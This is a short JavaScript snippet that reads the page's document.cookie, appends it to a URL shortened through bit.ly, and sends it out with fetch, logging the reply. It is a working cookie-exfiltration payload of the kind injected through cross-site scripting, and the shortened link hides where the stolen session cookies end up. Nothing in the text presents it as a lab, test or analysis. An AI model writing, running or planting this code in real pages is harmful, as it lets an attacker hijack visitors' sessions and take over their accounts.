let headersList = {
    "Accept": "*/*"
}
   
let url = "https://bit.ly/3Hkv2yj?cookie=" + document.cookie;
   
let response= await fetch(url, {
    method: "GET",
    headers: headersList
});
   
let data = await response.text();
console.log(data);
